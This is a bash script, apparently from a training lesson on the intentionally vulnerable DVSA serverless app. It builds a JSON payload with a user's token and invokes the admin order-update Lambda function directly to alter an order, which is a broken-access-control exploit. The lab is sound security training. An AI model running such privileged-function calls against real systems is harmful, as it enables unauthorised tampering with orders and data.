#!/bin/bash
# Lesson 5 — Broken Access Control
# Replace JWT_TOKEN, ORDER_ID, USER_ID before running.
# Usage: bash run.sh

JWT_TOKEN="YOUR_JWT_TOKEN_HERE"
ORDER_ID="YOUR_ORDER_ID_HERE"
USER_ID="YOUR_USER_ID_HERE"
REGION="us-east-1"

cat > /tmp/lesson5_payload.json << PAYLOAD
{
  "headers": { "Authorization": "$JWT_TOKEN" },
  "body": {
    "action": "update",
    "order-id": "$ORDER_ID",
    "item": {
      "itemList": {"1": 1}, "status": 120,
      "address": "100 Fake st NYC USA",
      "token": "YOUR_CONFIRMATION_TOKEN_HERE",
      "ts": 1775840000, "total": 35,
      "userId": "$USER_ID"
    }
  }
}
PAYLOAD

aws lambda invoke \
  --function-name DVSA-ADMIN-UPDATE-ORDERS \
  --payload file:///tmp/lesson5_payload.json \
  --output json \
  /tmp/lesson5_response.json \
  --region "$REGION"

echo "[*] Response:"
cat /tmp/lesson5_response.json